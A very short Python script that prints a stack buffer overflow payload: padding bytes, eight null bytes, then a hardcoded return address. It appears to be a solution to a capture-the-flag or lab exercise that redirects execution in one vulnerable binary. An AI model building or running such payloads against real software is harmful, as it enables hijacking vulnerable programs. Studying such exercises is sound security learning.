import sys


sys.stdout.buffer.write(b"A"*24 + b"\x00"*8 + b"\x59\x11\x40")